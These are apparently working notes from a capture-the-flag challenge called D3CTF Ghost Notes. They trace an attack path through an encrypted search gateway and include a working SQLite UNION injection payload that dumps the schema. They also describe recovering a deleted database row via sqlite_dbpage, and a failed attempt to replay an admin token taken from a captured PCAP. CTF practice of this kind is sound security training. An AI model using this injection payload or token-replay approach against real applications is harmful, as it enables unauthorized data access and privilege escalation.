# D3CTF Ghost Notes

## Confirmed path

1. The frontend delegates search to `/assets/crypto.worker-DW2VSort.js`.
2. The worker performs:
   - `POST /api/session/guest`
   - `POST /api/transport/bootstrap`
   - encrypted `POST /api/gateway` with target `search`
3. Search query is interpolated into SQLite. Working schema dump payload:

```text
%' UNION ALL SELECT 999,name,sql FROM sqlite_master--
```

4. `q_8f3c1a72d90e4b65` exposes downloadable PCAP metadata.
5. `sqlite_dbpage` is available through the SQLi and reveals a deleted row:

```json
{"tag":"Ghost_Zero","deleted":true,"storagePath":"/app/data/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap","downloadPath":"/test/7f9c18a2e44d/fe291443882d55af94bff1f9cddffb73.pcap","bytes":3048,"sha256":"1829670b437f5d952df05bb7b4440772372e83c22ec799452d5da08a7957204b"}
```

6. The deleted PCAP contains the legacy admin bootstrap flow:
   - `POST /ddddddtestStat`
   - `POST /api/auth/exchange`
   - Returned admin JWT with `role=admin`

## Live blocker

`GET /api/flag` exists and returns:

```json
{"error":"admin role required"}
```

with a valid guest token. Replaying the PCAP ticket or admin token fails live because the capture signatures are sanitized/invalid:

```json
{"error":"signature verification failed"}
```

## Useful local files

- `ghost-client.mjs`: encrypted gateway client.
- `ghost-lib.mjs`: reusable ECDH/AES-GCM helpers.
- `dump-db.mjs`: reconstructs `archive.sqlite` from `sqlite_dbpage`.
- `archive.sqlite`: reconstructed database.
- `fe291443882d55af94bff1f9cddffb73.pcap`: deleted Ghost_Zero PCAP.
- `recovered-rs256-public.pem`: recovered current guest-token verification key.
